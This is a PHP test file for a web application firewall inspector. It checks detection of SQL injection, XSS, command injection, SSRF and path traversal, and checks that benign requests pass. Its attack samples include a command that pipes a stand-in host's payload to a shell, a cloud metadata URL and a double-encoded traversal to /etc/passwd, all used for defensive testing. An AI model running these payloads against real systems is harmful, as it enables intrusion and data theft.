<?php

declare(strict_types=1);

require __DIR__ . '/../bootstrap.php';

$inspectorClass = implode(chr(92), ['TokenHub', 'Services', 'WafRequestInspector']);
$requestClass = implode(chr(92), ['TokenHub', 'Support', 'Request']);
$contextClass = implode(chr(92), ['TokenHub', 'Support', 'RequestContext']);

$inspector = new $inspectorClass();
$settings = [
    'enabled' => true,
    'mode' => 'observe',
    'block_threshold' => 100,
    'max_inspect_bytes' => 65536,
    'max_field_count' => 128,
    'max_field_bytes' => 4096,
    'excluded_paths' => ['/health'],
];
$rules = [[
    'rule_code' => 'attack_sql_injection',
    'matcher' => [
        'type' => 'attack',
        'categories' => ['sqli'],
        'targets' => ['query'],
        'weight' => 100,
        'critical' => false,
    ],
    'status' => 'active',
]];
$request = new $requestClass(
    'GET',
    '/v1/models',
    [],
    ['q' => '1%20UNION%20SELECT%201'],
    [],
    '',
    new $contextClass('req_waf_inspector', 'trc_waf_inspector')
);

$result = $inspector->inspect($request, $rules, $settings);

assert_true($result['matched'], 'Encoded SQL injection should be detected.');
assert_same(100, $result['risk_score'], 'SQL injection should retain its configured weight.');
assert_same(['sqli'], $result['categories'], 'SQL injection should retain its attack category.');
assert_true($result['blocked'], 'Score at the threshold should be block eligible.');

$attackCases = [
    ['xss', ['message' => '&lt;script&gt;alert(1)&lt;/script&gt;'], [], ['body']],
    ['command_injection', ['command' => '; curl http://example.invalid/payload | sh'], [], ['body']],
    ['ssrf', ['url' => 'http://169.254.169.254/latest/meta-data/'], [], ['body']],
    ['path_traversal', [], ['file' => '%252e%252e%252fetc%252fpasswd'], ['query']],
];
foreach ($attackCases as [$category, $body, $query, $targets]) {
    $attackRequest = new $requestClass('POST', '/v1/test', [], $query, $body, '', new $contextClass('req_' . $category, 'trc_' . $category));
    $attackRules = [[
        'rule_code' => 'attack_' . $category,
        'matcher' => ['type' => 'attack', 'categories' => [$category], 'targets' => $targets, 'weight' => 100, 'critical' => false],
        'status' => 'active',
    ]];
    $attackResult = $inspector->inspect($attackRequest, $attackRules, $settings);
    assert_true($attackResult['matched'], $category . ' should be detected.');
    assert_same([$category], $attackResult['categories'], $category . ' should retain its attack category.');
}

$normalRequest = new $requestClass('POST', '/v1/chat/completions', [], [], ['prompt' => 'Explain why SELECT is a database keyword.'], '', new $contextClass('req_normal', 'trc_normal'));
$normalResult = $inspector->inspect($normalRequest, $rules, $settings);
assert_true(!$normalResult['matched'], 'Normal prompt text should not be classified as an attack.');

$healthRequest = new $requestClass('GET', '/health', [], ['q' => '1 UNION SELECT 1'], [], '', new $contextClass('req_health', 'trc_health'));
$healthResult = $inspector->inspect($healthRequest, $rules, $settings);
assert_true(!$healthResult['matched'], 'Excluded health endpoint should not be inspected.');
